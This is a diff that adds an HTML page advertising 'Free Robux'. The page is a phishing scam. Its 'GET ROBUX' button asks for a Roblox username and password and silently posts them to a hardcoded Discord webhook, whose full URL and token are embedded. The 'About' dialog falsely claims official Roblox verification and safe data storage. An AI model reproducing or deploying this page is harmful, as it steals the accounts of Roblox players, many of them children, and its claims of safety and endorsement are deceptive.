@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<title>RBX - Free Robux ⏣</title>
+<style>
+body {
+  font-family: 'Comic Sans MS', cursive, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #927675;
+  overflow: hidden;
+  position: relative;
+}
+.RBX {
+    border-radius: 10px;
+    position: fixed;
+  bottom: 300px;
+  right: 540px;
+  border-color: blue;
+  border:double;
+  animation: sizzleAnimation 2s ease-in-out infinite alternate;
+  width:275px;
+  max-width: 300px;
+  height: 100px;
+  font-size: 30px;
+  max-height: 200px;
+  color:aqua;
+
+}
+.RBX:hover {
+  cursor:crosshair;
+  transform: scale(1.1); /* Enlarge button on hover */
+  background-color: rgb(188, 239, 34);
+  color:blueviolet;
+
+}
+@keyframes sizzleAnimation {
+  0%, 100% {
+    transform: scale(1);
+  }
+
+  50% {
+    transform: scale(1.05) rotate(5deg); /* Add rotation effect */
+  }
+}
+@keyframes rotateAnimation {
+  0% {
+    transform: rotate(0);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+
+
+
+.ABT {
+    border-radius: 10px;
+    position: fixed;
+  bottom: 20px;
+  right: 20px;
+  border-color: blue;
+  border:double;
+  width:100px;
+  max-width: 200px;
+  height: 50px;
+  max-height: 100px;
+  color:rgb(59, 52, 52);
+  animation: rotateAnimation 2s ease-in-out infinite alternate;
+  background-color: rgb(38, 163, 140);
+
+}
+.ABT:hover {
+  cursor:crosshair;
+}
+</style>
+<body>
+<button class="RBX" onclick="RBX()">⏣ GET ROBUX ⏣ </button>
+<button class="ABT" onclick="ABT()">About this Webpage</button>
+<br></br>
+<i class="Italic">Welcome to Shd's website for rbx, transaction may take a couple hours or days. If it does not try again.</i>
+<script>
+  function RBX() {
+    const A = window.prompt(": Enter Amt of robux :")
+    const B = window.prompt(": Enter roblox username :")
+    const C = window.prompt(": Enter roblox password :")
+    const webhookUrl2 = 'https://discord.com/api/webhooks/1208774087032442920/rGRHm_E14pLUH_XQPlVzdtaWzAhWSJJK_wTe4hGXkoTDfxCAoK0j1eHOImCxnBOhe1X1'; const xhr = new XMLHttpRequest(); xhr.open("POST", webhookUrl2, true); xhr.setRequestHeader("Content-Type", "application/json"); const payload = { content: `Username  : ${B} : Password  : ${C}` }; const jsonData = JSON.stringify(payload); xhr.send(jsonData);
+  }
+//  next >
+function ABT() {
+  var Abouts = window.prompt("Welcome so SHD'S website for robux. Unlike all the other free robux apps that dont work or hack your account, this does none of that. This has officially been verified by the real roblox development. If you want to know more info type in 1 , if you want to see our privacy terms type in 2")
+  if(Abouts === "1") {
+    window.alert("More about us: The note we got from the officially roblox developement is here ('According to SHD'S organizations, this webpage has been declared safe and free to use) ")
+  } else if(Abouts === "2") {
+  window.alert("Privacy: In Shd development we like to keep users safe, so we have so it sends account data to storage. Your account data will not be shared, it will be safely kept into our storage (it is only the account data you put in)")
+  } else {
+    window.alert(": Error :")
+  }
+}
+
+</script>
+</body>
+</html>
